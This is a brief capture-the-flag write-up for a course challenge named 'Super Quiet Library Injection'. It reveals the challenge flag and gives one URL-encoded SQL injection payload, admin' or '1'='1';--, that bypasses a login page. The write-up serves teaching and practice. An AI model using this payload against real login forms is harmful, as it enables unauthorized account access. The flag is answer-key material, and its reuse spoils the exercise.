# Challenge

**Name:** Super Quiet Library Injection

**Category:** Vulnerabilities

**Difficulty:** Hard

**Description:** 

You need to be very quiet in the **Super Quiet Library** and not **Inject** any noise into the environment!

**Flag:** CITS1003{iNj3tInG_tH3_5Ql_l00000l!!!!11one!!}

## Solution

### SQLi Authentication Bypass

* The login page is vulnerable to SQLi authentication bypass

* Example POST payload (it is URL encoded as well)
```
username=admin%27+or+%271%27+%3D+%271%27%3B--&password=test
```